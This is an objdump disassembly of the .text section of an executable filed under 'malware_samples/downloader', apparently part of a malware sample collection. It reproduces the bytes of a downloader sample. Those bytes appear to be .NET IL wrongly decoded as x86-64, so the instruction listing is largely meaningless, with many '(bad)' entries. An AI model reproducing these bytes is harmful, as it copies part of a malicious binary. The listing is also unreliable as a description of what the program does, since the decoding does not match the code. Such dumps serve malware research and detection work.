
malware_samples/downloader/8aacb0fd6ea3143d0e7a6b56f7b90c3be760bcc8abbbb29c4334b50f06e822f6.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140002000 <.text>:
   140002000:	48 00 00             	rex.W add %al,(%rax)
   140002003:	00 02                	add    %al,(%rdx)
   140002005:	00 05 00 78 2c 00    	add    %al,0x2c7800(%rip)        # 0x1402c980b
   14000200b:	00 74 20 00          	add    %dh,0x0(%rax,%riz,1)
   14000200f:	00 01                	add    %al,(%rcx)
   140002011:	00 00                	add    %al,(%rax)
   140002013:	00 08                	add    %cl,(%rax)
   140002015:	00 00                	add    %al,(%rax)
   140002017:	06                   	(bad)
	...
   140002048:	1b 30                	sbb    (%rax),%esi
   14000204a:	03 00                	add    (%rax),%eax
   14000204c:	62                   	(bad)
   14000204d:	00 00                	add    %al,(%rax)
   14000204f:	00 01                	add    %al,(%rcx)
   140002051:	00 00                	add    %al,(%rax)
   140002053:	11 73 1b             	adc    %esi,0x1b(%rbx)
   140002056:	00 00                	add    %al,(%rax)
   140002058:	06                   	(bad)
   140002059:	0a 06                	or     (%rsi),%al
   14000205b:	72 01                	jb     0x14000205e
   14000205d:	00 00                	add    %al,(%rax)
   14000205f:	70 20                	jo     0x140002081
   140002061:	37                   	(bad)
   140002062:	33 00                	xor    (%rax),%eax
   140002064:	00 6f 13             	add    %ch,0x13(%rdi)
   140002067:	00 00                	add    %al,(%rax)
   140002069:	06                   	(bad)
   14000206a:	2c 3a                	sub    $0x3a,%al
   14000206c:	06                   	(bad)
   14000206d:	02 72 25             	add    0x25(%rdx),%dh
   140002070:	00 00                	add    %al,(%rax)
   140002072:	70 6f                	jo     0x1400020e3
   140002074:	15 00 00 06 2c       	adc    $0x2c060000,%eax
   140002079:	2c 16                	sub    $0x16,%al
   14000207b:	0b 2b                	or     (%rbx),%ebp
   14000207d:	1d 06 6f 16 00       	sbb    $0x166f06,%eax
   140002082:	00 06                	add    %al,(%rsi)
   140002084:	0c 08                	or     $0x8,%al
   140002086:	2c 0f                	sub    $0xf,%al
   140002088:	06                   	(bad)
   140002089:	6f                   	outsl  (%rsi),(%dx)
   14000208a:	1a 00                	sbb    (%rax),%al
   14000208c:	00 06                	add    %al,(%rsi)
   14000208e:	08 03                	or     %al,(%rbx)
   140002090:	28 0a                	sub    %cl,(%rdx)
   140002092:	00 00                	add    %al,(%rax)
   140002094:	06                   	(bad)
   140002095:	de 1e                	ficomps (%rsi)
   140002097:	07                   	(bad)
   140002098:	17                   	(bad)
   140002099:	58                   	pop    %rax
   14000209a:	0b 07                	or     (%rdi),%eax
   14000209c:	1f                   	(bad)
   14000209d:	1e                   	(bad)
   14000209e:	32 de                	xor    %dh,%bl
   1400020a0:	06                   	(bad)
   1400020a1:	6f                   	outsl  (%rsi),(%dx)
   1400020a2:	1a 00                	sbb    (%rax),%al
   1400020a4:	00 06                	add    %al,(%rsi)
   1400020a6:	20 88 13 00 00 28    	and    %cl,0x28000013(%rax)
   1400020ac:	13 00                	adc    (%rax),%eax
   1400020ae:	00 0a                	add    %cl,(%rdx)
   1400020b0:	2b a2 26 de 00 2a    	sub    0x2a00de26(%rdx),%esp
   1400020b6:	00 00                	add    %al,(%rax)
   1400020b8:	01 10                	add    %edx,(%rax)
   1400020ba:	00 00                	add    %al,(%rax)
   1400020bc:	00 00                	add    %al,(%rax)
   1400020be:	00 00                	add    %al,(%rax)
   1400020c0:	5e                   	pop    %rsi
   1400020c1:	5e                   	pop    %rsi
   1400020c2:	00 03                	add    %al,(%rbx)
   1400020c4:	10 00                	adc    %al,(%rax)
   1400020c6:	00 01                	add    %al,(%rcx)
   1400020c8:	1b 30                	sbb    (%rax),%esi
   1400020ca:	04 00                	add    $0x0,%al
   1400020cc:	5f                   	pop    %rdi
   1400020cd:	00 00                	add    %al,(%rax)
   1400020cf:	00 00                	add    %al,(%rax)
   1400020d1:	00 00                	add    %al,(%rax)
   1400020d3:	00 73 14             	add    %dh,0x14(%rbx)
   1400020d6:	00 00                	add    %al,(%rax)
   1400020d8:	0a 25 6f 15 00 00    	or     0x156f(%rip),%ah        # 0x14000364d
   1400020de:	0a 28                	or     (%rax),%ch
   1400020e0:	16                   	(bad)
   1400020e1:	00 00                	add    %al,(%rax)
   1400020e3:	0a 6f 17             	or     0x17(%rdi),%ch
   1400020e6:	00 00                	add    %al,(%rax)
   1400020e8:	0a 6f 18             	or     0x18(%rdi),%ch
   1400020eb:	00 00                	add    %al,(%rax)
   1400020ed:	0a 6f 19             	or     0x19(%rdi),%ch
   1400020f0:	00 00                	add    %al,(%rax)
   1400020f2:	0a 25 6f 15 00 00    	or     0x156f(%rip),%ah        # 0x140003667
   1400020f8:	0a 02                	or     (%rdx),%al
   1400020fa:	17                   	(bad)
   1400020fb:	6f                   	outsl  (%rsi),(%dx)
   1400020fc:	1a 00                	sbb    (%rax),%al
   1400020fe:	00 0a                	add    %cl,(%rdx)
   140002100:	6f                   	outsl  (%rsi),(%dx)
   140002101:	1b 00                	sbb    (%rax),%eax
   140002103:	00 0a                	add    %cl,(%rdx)
   140002105:	25 6f 15 00 00       	and    $0x156f,%eax
   14000210a:	0a 17                	or     (%rdi),%dl
   14000210c:	6f                   	outsl  (%rsi),(%dx)
   14000210d:	1c 00                	sbb    $0x0,%al
   14000210f:	00 0a                	add    %cl,(%rdx)
   140002111:	25 6f 15 00 00       	and    $0x156f,%eax
   140002116:	0a 16                	or     (%rsi),%dl
   140002118:	6f                   	outsl  (%rsi),(%dx)
   140002119:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
   14000211e:	1e                   	(bad)
   14000211f:	00 00                	add    %al,(%rax)
   140002121:	0a 26                	or     (%rsi),%ah
   140002123:	20 b8 0b 00 00 28    	and    %bh,0x2800000b(%rax)
   140002129:	13 00                	adc    (%rax),%eax
   14000212b:	00 0a                	add    %cl,(%rdx)
   14000212d:	de 03                	fiadds (%rbx)
   14000212f:	26 de 00             	es fiadds (%rax)
   140002132:	2a 00                	sub    (%rax),%al
   140002134:	01 10                	add    %edx,(%rax)
   140002136:	00 00                	add    %al,(%rax)
   140002138:	00 00                	add    %al,(%rax)
   14000213a:	00 00                	add    %al,(%rax)
   14000213c:	5b                   	pop    %rbx
   14000213d:	5b                   	pop    %rbx
   14000213e:	00 03                	add    %al,(%rbx)
   140002140:	10 00                	adc    %al,(%rax)
   140002142:	00 01                	add    %al,(%rcx)
   140002144:	5e                   	pop    %rsi
   140002145:	28 06                	sub    %al,(%rsi)
   140002147:	00 00                	add    %al,(%rax)
   140002149:	06                   	(bad)
   14000214a:	2d 0f 72 27 00       	sub    $0x27720f,%eax
   14000214f:	00 70 72             	add    %dh,0x72(%rax)
   140002152:	25 00 00 70 28       	and    $0x28700000,%eax
   140002157:	01 00                	add    %eax,(%rax)
   140002159:	00 06                	add    %al,(%rsi)
   14000215b:	2a 1b                	sub    (%rbx),%bl
   14000215d:	30 03                	xor    %al,(%rbx)
   14000215f:	00 29                	add    %ch,(%rcx)
   140002161:	00 00                	add    %al,(%rax)
   140002163:	00 00                	add    %al,(%rax)
   140002165:	00 00                	add    %al,(%rax)
   140002167:	00 03                	add    %al,(%rbx)
   140002169:	28 1f                	sub    %bl,(%rdi)
   14000216b:	00 00                	add    %al,(%rax)
   14000216d:	0a 25 25 2d 03 26    	or     0x26032d25(%rip),%ah        # 0x166034e98
   140002173:	2b 05 28 20 00 00    	sub    0x2028(%rip),%eax        # 0x1400041a1
   140002179:	0a 25 2d 03 26 2b    	or     0x2b26032d(%rip),%ah        # 0x16b2624ac
   14000217f:	05 28 21 00 00       	add    $0x2128,%eax
   140002184:	0a 02                	or     (%rdx),%al
   140002186:	28 05 00 00 06 de    	sub    %al,-0x21fa0000(%rip)        # 0x11e06218c
   14000218c:	03 26                	add    (%rsi),%esp
   14000218e:	de 00                	fiadds (%rax)
   140002190:	2a 00                	sub    (%rax),%al
   140002192:	00 00                	add    %al,(%rax)
   140002194:	01 10                	add    %edx,(%rax)
   140002196:	00 00                	add    %al,(%rax)
   140002198:	00 00                	add    %al,(%rax)
   14000219a:	00 00                	add    %al,(%rax)
   14000219c:	25 25 00 03 10       	and    $0x10030025,%eax
   1400021a1:	00 00                	add    %al,(%rax)
   1400021a3:	01 1b                	add    %ebx,(%rbx)
   1400021a5:	30 03                	xor    %al,(%rbx)
   1400021a7:	00 5f 00             	add    %bl,0x0(%rdi)
   1400021aa:	00 00                	add    %al,(%rax)
   1400021ac:	00 00                	add    %al,(%rax)
   1400021ae:	00 00                	add    %al,(%rax)
   1400021b0:	73 14                	jae    0x1400021c6
   1400021b2:	00 00                	add    %al,(%rax)
   1400021b4:	0a 25 6f 15 00 00    	or     0x156f(%rip),%ah        # 0x140003729
   1400021ba:	0a 28                	or     (%rax),%ch
   1400021bc:	16                   	(bad)
   1400021bd:	00 00                	add    %al,(%rax)
   1400021bf:	0a 6f 17             	or     0x17(%rdi),%ch
   1400021c2:	00 00                	add    %al,(%rax)
   1400021c4:	0a 6f 18             	or     0x18(%rdi),%ch
   1400021c7:	00 00                	add    %al,(%rax)
   1400021c9:	0a 6f 19             	or     0x19(%rdi),%ch
   1400021cc:	00 00                	add    %al,(%rax)
   1400021ce:	0a 25 6f 15 00 00    	or     0x156f(%rip),%ah        # 0x140003743
   1400021d4:	0a 02                	or     (%rdx),%al
   1400021d6:	6f                   	outsl  (%rsi),(%dx)
   1400021d7:	1b 00                	sbb    (%rax),%eax
   1400021d9:	00 0a                	add    %cl,(%rdx)
   1400021db:	25 6f 15 00 00       	and    $0x156f,%eax
   1400021e0:	0a 17                	or     (%rdi),%dl
   1400021e2:	6f                   	outsl  (%rsi),(%dx)
   1400021e3:	1c 00                	sbb    $0x0,%al
   1400021e5:	00 0a                	add    %cl,(%rdx)
   1400021e7:	25 6f 15 00 00       	and    $0x156f,%eax
   1400021ec:	0a 16                	or     (%rsi),%dl
   1400021ee:	6f                   	outsl  (%rsi),(%dx)
   1400021ef:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
   1400021f4:	6f                   	outsl  (%rsi),(%dx)
   1400021f5:	1e                   	(bad)
   1400021f6:	00 00                	add    %al,(%rax)
   1400021f8:	0a 26                	or     (%rsi),%ah
   1400021fa:	6f                   	outsl  (%rsi),(%dx)
   1400021fb:	20 00                	and    %al,(%rax)
   1400021fd:	00 0a                	add    %cl,(%rdx)
   1400021ff:	20 88 13 00 00 28    	and    %cl,0x28000013(%rax)
   140002205:	13 00                	adc    (%rax),%eax
   140002207:	00 0a                	add    %cl,(%rdx)
   140002209:	2b a5 26 de 00 2a    	sub    0x2a00de26(%rbp),%esp
   14000220f:	00 01                	add    %al,(%rcx)
   140002211:	10 00                	adc    %al,(%rax)
   140002213:	00 00                	add    %al,(%rax)
   140002215:	00 00                	add    %al,(%rax)
   140002217:	00 5b 5b             	add    %bl,0x5b(%rbx)
   14000221a:	00 03                	add    %al,(%rbx)
   14000221c:	10 00                	adc    %al,(%rax)
   14000221e:	00 01                	add    %al,(%rcx)
   140002220:	13 30                	adc    (%rax),%esi
   140002222:	03 00                	add    (%rax),%eax
   140002224:	32 00                	xor    (%rax),%al
   140002226:	00 00                	add    %al,(%rax)
   140002228:	02 00                	add    (%rax),%al
   14000222a:	00 11                	add    %dl,(%rcx)
   14000222c:	73 2a                	jae    0x140002258
   14000222e:	00 00                	add    %al,(%rax)
   140002230:	06                   	(bad)
   140002231:	0a 06                	or     (%rsi),%al
   140002233:	28 16                	sub    %dl,(%rsi)
   140002235:	00 00                	add    %al,(%rax)
   140002237:	0a 6f 22             	or     0x22(%rdi),%ch
   14000223a:	00 00                	add    %al,(%rax)
   14000223c:	0a 7d 11             	or     0x11(%rbp),%bh
   14000223f:	00 00                	add    %al,(%rax)
   140002241:	04 28                	add    $0x28,%al
   140002243:	23 00                	and    (%rax),%eax
   140002245:	00 0a                	add    %cl,(%rdx)
   140002247:	28 01                	sub    %al,(%rcx)
   140002249:	00 00                	add    %al,(%rax)
   14000224b:	2b 06                	sub    (%rsi),%eax
   14000224d:	fe 06                	incb   (%rsi)
   14000224f:	2b 00                	sub    (%rax),%eax
   140002251:	00 06                	add    %al,(%rsi)
   140002253:	73 25                	jae    0x14000227a
   140002255:	00 00                	add    %al,(%rax)
   140002257:	0a 28                	or     (%rax),%ch
   140002259:	02 00                	add    (%rax),%al
   14000225b:	00 2b                	add    %ch,(%rbx)
   14000225d:	2a 00                	sub    (%rax),%al
   14000225f:	00 13                	add    %dl,(%rbx)
   140002261:	30 02                	xor    %al,(%rdx)
   140002263:	00 1c 00             	add    %bl,(%rax,%rax,1)
   140002266:	00 00                	add    %al,(%rax)
   140002268:	03 00                	add    (%rax),%eax
   14000226a:	00 11                	add    %dl,(%rcx)
   14000226c:	28 16                	sub    %dl,(%rsi)
   14000226e:	00 00                	add    %al,(%rax)
   140002270:	0a 6f 27             	or     0x27(%rdi),%ch
   140002273:	00 00                	add    %al,(%rax)
   140002275:	0a 6f 28             	or     0x28(%rdi),%ch
   140002278:	00 00                	add    %al,(%rax)
   14000227a:	0a 0a                	or     (%rdx),%cl
   14000227c:	7e 01                	jle    0x14000227f
   14000227e:	00 00                	add    %al,(%rax)
   140002280:	04 06                	add    $0x6,%al
   140002282:	6f                   	outsl  (%rsi),(%dx)
   140002283:	29 00                	sub    %eax,(%rax)
   140002285:	00 0a                	add    %cl,(%rdx)
   140002287:	2a 13                	sub    (%rbx),%dl
   140002289:	30 03                	xor    %al,(%rbx)
   14000228b:	00 d7                	add    %dl,%bh
   14000228d:	00 00                	add    %al,(%rax)
   14000228f:	00 04 00             	add    %al,(%rax,%rax,1)
   140002292:	00 11                	add    %dl,(%rcx)
   140002294:	28 07                	sub    %al,(%rdi)
   140002296:	00 00                	add    %al,(%rax)
   140002298:	06                   	(bad)
   140002299:	39 cc                	cmp    %ecx,%esp
   14000229b:	00 00                	add    %al,(%rax)
   14000229d:	00 02                	add    %al,(%rdx)
   14000229f:	8e 69 0a             	mov    0xa(%rcx),%gs
   1400022a2:	06                   	(bad)
   1400022a3:	45 04 00             	rex.RB add $0x0,%al
   1400022a6:	00 00                	add    %al,(%rax)
   1400022a8:	05 00 00 00 27       	add    $0x27000000,%eax
   1400022ad:	00 00                	add    %al,(%rax)
   1400022af:	00 a5 00 00 00 6a    	add    %ah,0x6a000000(%rbp)
   1400022b5:	00 00                	add    %al,(%rax)
   1400022b7:	00 38                	add    %bh,(%rax)
   1400022b9:	a0 00 00 00 28 06 00 	movabs 0x600000628000000,%al
   1400022c0:	00 06 
   1400022c2:	2d 0b 72 27 00       	sub    $0x27720b,%eax
   1400022c7:	00 70 28             	add    %dh,0x28(%rax)
   1400022ca:	05 00 00 06 2a       	add    $0x2a060000,%eax
   1400022cf:	72 27                	jb     0x1400022f8
   1400022d1:	00 00                	add    %al,(%rax)
   1400022d3:	70 72                	jo     0x140002347
   1400022d5:	25 00 00 70 28       	and    $0x28700000,%eax
   1400022da:	01 00                	add    %eax,(%rax)
   1400022dc:	00 06                	add    %al,(%rsi)
   1400022de:	2a 02                	sub    (%rdx),%al
   1400022e0:	16                   	(bad)
   1400022e1:	9a                   	(bad)
   1400022e2:	16                   	(bad)
   1400022e3:	6f                   	outsl  (%rsi),(%dx)
   1400022e4:	2a 00                	sub    (%rax),%al
   1400022e6:	00 0a                	add    %cl,(%rdx)
   1400022e8:	1f                   	(bad)
   1400022e9:	52                   	push   %rdx
   1400022ea:	33 16                	xor    (%rsi),%edx
   1400022ec:	02 16                	add    (%rsi),%dl
   1400022ee:	9a                   	(bad)
   1400022ef:	18 6f 2a             	sbb    %ch,0x2a(%rdi)
   1400022f2:	00 00                	add    %al,(%rax)
   1400022f4:	0a 1f                	or     (%rdi),%bl
   1400022f6:	65 33 09             	xor    %gs:(%rcx),%ecx
   1400022f9:	02 16                	add    (%rsi),%dl
   1400022fb:	9a                   	(bad)
   1400022fc:	28 02                	sub    %al,(%rdx)
   1400022fe:	00 00                	add    %al,(%rax)
   140002300:	06                   	(bad)
   140002301:	2a 02                	sub    (%rdx),%al
   140002303:	16                   	(bad)
   140002304:	9a                   	(bad)
   140002305:	16                   	(bad)
   140002306:	6f                   	outsl  (%rsi),(%dx)
   140002307:	2a 00                	sub    (%rax),%al
   140002309:	00 0a                	add    %cl,(%rdx)
   14000230b:	1f                   	(bad)
   14000230c:	52                   	push   %rdx
   14000230d:	33 4e 02             	xor    0x2(%rsi),%ecx
   140002310:	16                   	(bad)
   140002311:	9a                   	(bad)
   140002312:	18 6f 2a             	sbb    %ch,0x2a(%rdi)
   140002315:	00 00                	add    %al,(%rax)
   140002317:	0a 1f                	or     (%rdi),%bl
   140002319:	63 33                	movsxd (%rbx),%esi
   14000231b:	41 28 03             	sub    %al,(%r11)
   14000231e:	00 00                	add    %al,(%rax)
   140002320:	06                   	(bad)
   140002321:	2a 02                	sub    (%rdx),%al
   140002323:	16                   	(bad)
   140002324:	9a                   	(bad)
   140002325:	72 45                	jb     0x14000236c
   140002327:	00 00                	add    %al,(%rax)
   140002329:	70 28                	jo     0x140002353
   14000232b:	2b 00                	sub    (%rax),%eax
   14000232d:	00 0a                	add    %cl,(%rdx)
   14000232f:	2c 11                	sub    $0x11,%al
   140002331:	02 17                	add    (%rdi),%dl
   140002333:	9a                   	(bad)
   140002334:	02 18                	add    (%rax),%bl
   140002336:	9a                   	(bad)
   140002337:	28 2c 00             	sub    %ch,(%rax,%rax,1)
   14000233a:	00 0a                	add    %cl,(%rdx)
   14000233c:	28 04 00             	sub    %al,(%rax,%rax,1)
   14000233f:	00 06                	add    %al,(%rsi)
   140002341:	2a 02                	sub    (%rdx),%al
   140002343:	16                   	(bad)
   140002344:	9a                   	(bad)
   140002345:	72 4b                	jb     0x140002392
   140002347:	00 00                	add    %al,(%rax)
   140002349:	70 28                	jo     0x140002373
   14000234b:	2b 00                	sub    (%rax),%eax
   14000234d:	00 0a                	add    %cl,(%rdx)
   14000234f:	2c 0c                	sub    $0xc,%al
   140002351:	02 17                	add    (%rdi),%dl
   140002353:	9a                   	(bad)
   140002354:	02 18                	add    (%rax),%bl
   140002356:	9a                   	(bad)
   140002357:	28 01                	sub    %al,(%rcx)
   140002359:	00 00                	add    %al,(%rax)
   14000235b:	06                   	(bad)
   14000235c:	2a 02                	sub    (%rdx),%al
   14000235e:	16                   	(bad)
   14000235f:	9a                   	(bad)
   140002360:	72 25                	jb     0x140002387
   140002362:	00 00                	add    %al,(%rax)
   140002364:	70 28                	jo     0x14000238e
   140002366:	01 00                	add    %eax,(%rax)
   140002368:	00 06                	add    %al,(%rsi)
   14000236a:	2a ae 73 2d 00 00    	sub    0x2d73(%rsi),%ch
   140002370:	0a 25 72 51 00 00    	or     0x5172(%rip),%ah        # 0x1400074e8
   140002376:	70 28                	jo     0x1400023a0
   140002378:	28 00                	sub    %al,(%rax)
   14000237a:	00 0a                	add    %cl,(%rdx)
   14000237c:	6f                   	outsl  (%rsi),(%dx)
   14000237d:	2e 00 00             	cs add %al,(%rax)
   140002380:	0a 25 72 63 00 00    	or     0x6372(%rip),%ah        # 0x1400086f8
   140002386:	70 28                	jo     0x1400023b0
   140002388:	28 00                	sub    %al,(%rax)
   14000238a:	00 0a                	add    %cl,(%rdx)
   14000238c:	6f                   	outsl  (%rsi),(%dx)
   14000238d:	2e 00 00             	cs add %al,(%rax)
   140002390:	0a 80 01 00 00 04    	or     0x4000001(%rax),%al
   140002396:	2a 00                	sub    (%rax),%al
   140002398:	1b 30                	sbb    (%rax),%esi
   14000239a:	09 00                	or     %eax,(%rax)
   14000239c:	59                   	pop    %rcx
   14000239d:	00 00                	add    %al,(%rax)
   14000239f:	00 05 00 00 11 73    	add    %al,0x73110000(%rip)        # 0x1b31123a5
   1400023a5:	0e                   	(bad)
   1400023a6:	00 00                	add    %al,(%rax)
   1400023a8:	06                   	(bad)
   1400023a9:	02 28                	add    (%rax),%ch
   1400023ab:	0d 00 00 06 0a       	or     $0xa060000,%eax
   1400023b0:	06                   	(bad)
   1400023b1:	2d 02 de 47 06       	sub    $0x647de02,%eax
   1400023b6:	6f                   	outsl  (%rsi),(%dx)
   1400023b7:	0f 00 00             	sldt   (%rax)
   1400023ba:	06                   	(bad)
   1400023bb:	28 2f                	sub    %ch,(%rdi)
   1400023bd:	00 00                	add    %al,(%rax)
   1400023bf:	0a 0b                	or     (%rbx),%cl
   1400023c1:	07                   	(bad)
   1400023c2:	6f                   	outsl  (%rsi),(%dx)
   1400023c3:	30 00                	xor    %al,(%rax)
   1400023c5:	00 0a                	add    %cl,(%rdx)
   1400023c7:	14 28                	adc    $0x28,%al
   1400023c9:	31 00                	xor    %eax,(%rax)
   1400023cb:	00 0a                	add    %cl,(%rdx)
   1400023cd:	2c 28                	sub    $0x28,%al
   1400023cf:	07                   	(bad)
   1400023d0:	6f                   	outsl  (%rsi),(%dx)
   1400023d1:	30 00                	xor    %al,(%rax)
   1400023d3:	00 0a                	add    %cl,(%rdx)
   1400023d5:	14 17                	adc    $0x17,%al
   1400023d7:	8d 10                	lea    (%rax),%edx
   1400023d9:	00 00                	add    %al,(%rax)
   1400023db:	01 25 16 18 8d 28    	add    %esp,0x288d1816(%rip)        # 0x1688d3bf7
   1400023e1:	00 00                	add    %al,(%rax)
   1400023e3:	01 25 16 7e 02 00    	add    %esp,0x27e16(%rip)        # 0x14002a1ff
   1400023e9:	00 04 a2             	add    %al,(%rdx,%riz,4)
   1400023ec:	25 17 03 a2 a2       	and    $0xa2a20317,%eax
   1400023f1:	6f                   	outsl  (%rsi),(%dx)
   1400023f2:	32 00                	xor    (%rax),%al
   1400023f4:	00 0a                	add    %cl,(%rdx)
   1400023f6:	26 de 03             	es fiadds (%rbx)
   1400023f9:	26 de 00             	es fiadds (%rax)
   1400023fc:	2a 00                	sub    (%rax),%al
   1400023fe:	00 00                	add    %al,(%rax)
   140002400:	01 10                	add    %edx,(%rax)
   140002402:	00 00                	add    %al,(%rax)
   140002404:	00 00                	add    %al,(%rax)
   140002406:	00 00                	add    %al,(%rax)
   140002408:	55                   	push   %rbp
   140002409:	55                   	push   %rbp
   14000240a:	00 03                	add    %al,(%rbx)
   14000240c:	10 00                	adc    %al,(%rax)
   14000240e:	00 01                	add    %al,(%rcx)
   140002410:	1e                   	(bad)
   140002411:	02 28                	add    (%rax),%ch
   140002413:	33 00                	xor    (%rax),%eax
   140002415:	00 0a                	add    %cl,(%rdx)
   140002417:	2a 2e                	sub    (%rsi),%ch
   140002419:	72 7d                	jb     0x140002498
   14000241b:	00 00                	add    %al,(%rax)
   14000241d:	70 80                	jo     0x14000239f
   14000241f:	02 00                	add    (%rax),%al
   140002421:	00 04 2a             	add    %al,(%rdx,%rbp,1)
   140002424:	13 30                	adc    (%rax),%esi
   140002426:	07                   	(bad)
   140002427:	00 81 00 00 00 06    	add    %al,0x6000000(%rcx)
   14000242d:	00 00                	add    %al,(%rax)
   14000242f:	11 03                	adc    %eax,(%rbx)
   140002431:	16                   	(bad)
   140002432:	28 34 00             	sub    %dh,(%rax,%rax,1)
   140002435:	00 0a                	add    %cl,(%rdx)
   140002437:	0a 03                	or     (%rbx),%al
   140002439:	8e 69 06             	mov    0x6(%rcx),%gs
   14000243c:	2e 02 14 2a          	cs add (%rdx,%rbp,1),%dl
   140002440:	1a 0b                	sbb    (%rbx),%cl
   140002442:	1e                   	(bad)
   140002443:	8d 30                	lea    (%rax),%esi
   140002445:	00 00                	add    %al,(%rax)
   140002447:	01 0c 03             	add    %ecx,(%rbx,%rax,1)
   14000244a:	07                   	(bad)
   14000244b:	08 16                	or     %dl,(%rsi)
   14000244d:	08 8e 69 28 35 00    	or     %cl,0x352869(%rsi)
   140002453:	00 0a                	add    %cl,(%rdx)
   140002455:	07                   	(bad)
   140002456:	08 8e 69 58 0b 07    	or     %cl,0x70b5869(%rsi)
   14000245c:	13 04 16             	adc    (%rsi,%rdx,1),%eax
   14000245f:	13 05 2b 1d 03 11    	adc    0x11031d2b(%rip),%eax        # 0x151034190
   140002465:	04 03                	add    $0x3,%al
   140002467:	11 04 91             	adc    %eax,(%rcx,%rdx,4)
   14000246a:	08 11                	or     %dl,(%rcx)
   14000246c:	05 25 17 58 13       	add    $0x13581725,%eax
   140002471:	05 08 8e 69 5d       	add    $0x5d698e08,%eax
   140002476:	91                   	xchg   %eax,%ecx
   140002477:	61                   	(bad)
   140002478:	d2 9c 11 04 17 58 13 	rcrb   %cl,0x13581704(%rcx,%rdx,1)
   14000247f:	04 11                	add    $0x11,%al
   140002481:	04 06                	add    $0x6,%al
   140002483:	32 de                	xor    %dh,%bl
   140002485:	73 11                	jae    0x140002498
   140002487:	00 00                	add    %al,(%rax)
   140002489:	06                   	(bad)
   14000248a:	0d 09 06 07 59       	or     $0x59070609,%eax
   14000248f:	8d 30                	lea    (%rax),%esi
   140002491:	00 00                	add    %al,(%rax)
   140002493:	01 6f 10             	add    %ebp,0x10(%rdi)
   140002496:	00 00                	add    %al,(%rax)
   140002498:	06                   	(bad)
   140002499:	03 07                	add    (%rdi),%eax
   14000249b:	09 6f 0f             	or     %ebp,0xf(%rdi)
   14000249e:	00 00                	add    %al,(%rax)
   1400024a0:	06                   	(bad)
   1400024a1:	16                   	(bad)
   1400024a2:	09 6f 0f             	or     %ebp,0xf(%rdi)
   1400024a5:	00 00                	add    %al,(%rax)
   1400024a7:	06                   	(bad)
   1400024a8:	8e 69 28             	mov    0x28(%rcx),%gs
   1400024ab:	35 00 00 0a 09       	xor    $0x90a0000,%eax
   1400024b0:	2a 1e                	sub    (%rsi),%bl
   1400024b2:	02 28                	add    (%rax),%ch
   1400024b4:	36 00 00             	ss add %al,(%rax)
   1400024b7:	0a 2a                	or     (%rdx),%ch
   1400024b9:	1e                   	(bad)
   1400024ba:	02 7b 03             	add    0x3(%rbx),%bh
   1400024bd:	00 00                	add    %al,(%rax)
   1400024bf:	04 2a                	add    $0x2a,%al
   1400024c1:	22 02                	and    (%rdx),%al
   1400024c3:	03 7d 03             	add    0x3(%rbp),%edi
   1400024c6:	00 00                	add    %al,(%rax)
   1400024c8:	04 2a                	add    $0x2a,%al
   1400024ca:	1e                   	(bad)
   1400024cb:	02 28                	add    (%rax),%ch
   1400024cd:	36 00 00             	ss add %al,(%rax)
   1400024d0:	0a 2a                	or     (%rdx),%ch
   1400024d2:	00 00                	add    %al,(%rax)
   1400024d4:	1b 30                	sbb    (%rax),%esi
   1400024d6:	01 00                	add    %eax,(%rax)
   1400024d8:	10 00                	adc    %al,(%rax)
   1400024da:	00 00                	add    %al,(%rax)
   1400024dc:	00 00                	add    %al,(%rax)
   1400024de:	00 00                	add    %al,(%rax)
   1400024e0:	02 28                	add    (%rax),%ch
   1400024e2:	1a 00                	sbb    (%rax),%al
   1400024e4:	00 06                	add    %al,(%rsi)
   1400024e6:	de 07                	fiadds (%rdi)
   1400024e8:	02 28                	add    (%rax),%ch
   1400024ea:	10 00                	adc    %al,(%rax)
   1400024ec:	00 0a                	add    %cl,(%rdx)
   1400024ee:	dc 2a                	fsubrl (%rdx)
   1400024f0:	01 10                	add    %edx,(%rax)
   1400024f2:	00 00                	add    %al,(%rax)
   1400024f4:	02 00                	add    (%rax),%al
   1400024f6:	00 00                	add    %al,(%rax)
   1400024f8:	08 08                	or     %cl,(%rax)
   1400024fa:	00 07                	add    %al,(%rdi)
   1400024fc:	00 00                	add    %al,(%rax)
   1400024fe:	00 00                	add    %al,(%rax)
   140002500:	1b 30                	sbb    (%rax),%esi
   140002502:	05 00 6b 00 00       	add    $0x6b00,%eax
   140002507:	00 07                	add    %al,(%rdi)
   140002509:	00 00                	add    %al,(%rax)
   14000250b:	11 02                	adc    %eax,(%rdx)
   14000250d:	18 17                	sbb    %dl,(%rdi)
   14000250f:	1c 73                	sbb    $0x73,%al
   140002511:	37                   	(bad)
   140002512:	00 00                	add    %al,(%rax)
   140002514:	0a 7d 04             	or     0x4(%rbp),%bh
   140002517:	00 00                	add    %al,(%rax)
   140002519:	04 02                	add    $0x2,%al
   14000251b:	7b 04                	jnp    0x140002521
   14000251d:	00 00                	add    %al,(%rax)
   14000251f:	04 03                	add    $0x3,%al
   140002521:	28 19                	sub    %bl,(%rcx)
   140002523:	00 00                	add    %al,(%rax)
   140002525:	06                   	(bad)
   140002526:	04 14                	add    $0x14,%al
   140002528:	14 6f                	adc    $0x6f,%al
   14000252a:	38 00                	cmp    %al,(%rax)
   14000252c:	00 0a                	add    %cl,(%rdx)
   14000252e:	6f                   	outsl  (%rsi),(%dx)
   14000252f:	39 00                	cmp    %eax,(%rax)
   140002531:	00 0a                	add    %cl,(%rdx)
   140002533:	20 10                	and    %dl,(%rax)
   140002535:	27                   	(bad)
   140002536:	00 00                	add    %al,(%rax)
   140002538:	17                   	(bad)
   140002539:	6f                   	outsl  (%rsi),(%dx)
   14000253a:	3a 00                	cmp    (%rax),%al
   14000253c:	00 0a                	add    %cl,(%rdx)
   14000253e:	26 02 7b 04          	es add 0x4(%rbx),%bh
   140002542:	00 00                	add    %al,(%rax)
   140002544:	04 6f                	add    $0x6f,%al
   140002546:	3b 00                	cmp    (%rax),%eax
   140002548:	00 0a                	add    %cl,(%rdx)
   14000254a:	2c 20                	sub    $0x20,%al
   14000254c:	02 28                	add    (%rax),%ch
   14000254e:	3c 00                	cmp    $0x0,%al
   140002550:	00 0a                	add    %cl,(%rdx)
   140002552:	02 fe                	add    %dh,%bh
   140002554:	06                   	(bad)
   140002555:	17                   	(bad)
   140002556:	00 00                	add    %al,(%rax)
   140002558:	06                   	(bad)
   140002559:	73 3d                	jae    0x140002598
   14000255b:	00 00                	add    %al,(%rax)
   14000255d:	0a 6f 3e             	or     0x3e(%rdi),%ch
   140002560:	00 00                	add    %al,(%rax)
